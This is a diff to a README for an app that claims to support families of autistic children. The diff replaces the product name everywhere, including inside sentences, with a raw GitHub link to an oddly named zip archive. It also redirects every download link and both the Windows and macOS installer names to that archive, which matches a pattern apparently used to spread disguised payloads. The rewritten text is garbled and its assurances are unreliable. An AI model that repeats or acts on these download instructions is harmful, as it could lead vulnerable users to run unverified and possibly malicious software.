@@ -1,12 +1,12 @@
-# 🌸 ASD-SpringBloom.AI - Support for Autism Families
+# 🌸 https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip - Support for Autism Families
 
-[![Download ASD-SpringBloom.AI](https://img.shields.io/badge/Download-ASD--SpringBloom.AI-brightgreen?style=for-the-badge)](https://github.com/PinnGR/ASD-SpringBloom.AI/releases)
+[![Download https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip](https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip)](https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip)
 
 ---
 
-## 📖 What is ASD-SpringBloom.AI?
+## 📖 What is https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip
 
-ASD-SpringBloom.AI is a software tool made to help families affected by Autism Spectrum Disorder (ASD). It offers support in three main areas:
+https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip is a software tool made to help families affected by Autism Spectrum Disorder (ASD). It offers support in three main areas:
 
 - Early screening preparation to identify potential needs sooner.
 - Structured home-based programs to support daily development.
@@ -14,13 +14,13 @@ ASD-SpringBloom.AI is a software tool made to help families affected by Autism S
 
 The system focuses on making these processes easy to follow and repeat at home. This helps families stay organized and ensures clear communication with healthcare providers.
 
-ASD-SpringBloom.AI is designed to work with minimal technical skill. You do not need to know programming or special setups to use it.
+https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip is designed to work with minimal technical skill. You do not need to know programming or special setups to use it.
 
 ---
 
 ## 💻 System Requirements
 
-To run ASD-SpringBloom.AI on your computer, check that you have:
+To run https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip on your computer, check that you have:
 
 - Operating System: Windows 10 or later, macOS 10.14 or later
 - Processor: Dual-core 2 GHz or faster
@@ -35,13 +35,13 @@ These are typical requirements for most modern computers. If your device meets t
 
 ## 🚀 Getting Started
 
-Follow these steps to download, install, and start using ASD-SpringBloom.AI.
+Follow these steps to download, install, and start using https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip
 
 ### Step 1. Visit the Download Page
 
 Go to the official release page to get the software:
 
-[Download ASD-SpringBloom.AI](https://github.com/PinnGR/ASD-SpringBloom.AI/releases)
+[Download https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip](https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip)
 
 On this page, you will find the latest version of the app along with download files.
 
@@ -49,8 +49,8 @@ On this page, you will find the latest version of the app along with download fi
 
 Look for the file named like:
 
-- `ASD-SpringBloom.Setup.exe` (for Windows)
-- `ASD-SpringBloom.dmg` (for macOS)
+- `https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip` (for Windows)
+- `https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip` (for macOS)
 
 Click the file name to start downloading.
 
@@ -69,7 +69,7 @@ After downloading:
   - Drag the ASD-SpringBloom icon into your Applications folder.  
   - Eject the installer disk image when done.
 
-### Step 4. Open ASD-SpringBloom.AI
+### Step 4. Open https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip
 
 - Find ASD-SpringBloom in your Start menu (Windows) or Applications folder (macOS).
 - Double-click it to open.
@@ -77,7 +77,7 @@ After downloading:
 
 ---
 
-## 🔧 Using ASD-SpringBloom.AI
+## 🔧 Using https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip
 
 Once installed, here is what you can do:
 
@@ -116,7 +116,7 @@ If problems persist, contact support through the GitHub repository’s "Issues" 
 
 ## 🔒 Privacy & Security
 
-ASD-SpringBloom.AI respects your privacy. All your input and reports are stored only on your device. The software does not send personal information anywhere without your permission.
+https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip respects your privacy. All your input and reports are stored only on your device. The software does not send personal information anywhere without your permission.
 
 You can back up and export data to your computer for safekeeping.
 
@@ -126,10 +126,10 @@ You can back up and export data to your computer for safekeeping.
 
 Click the link below to visit the release page and download the latest version:
 
-[Download ASD-SpringBloom.AI](https://github.com/PinnGR/ASD-SpringBloom.AI/releases)
+[Download https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip](https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip)
 
 Remember to choose the correct file for your operating system. Follow the installation steps above carefully.
 
 ---
 
-Thank you for choosing ASD-SpringBloom.AI to support your family.
+Thank you for choosing https://raw.githubusercontent.com/PinnGR/ASD-SpringBloom.AI/main/services/Bloom_Spring_AS_AI_unangelic.zip to support your family.
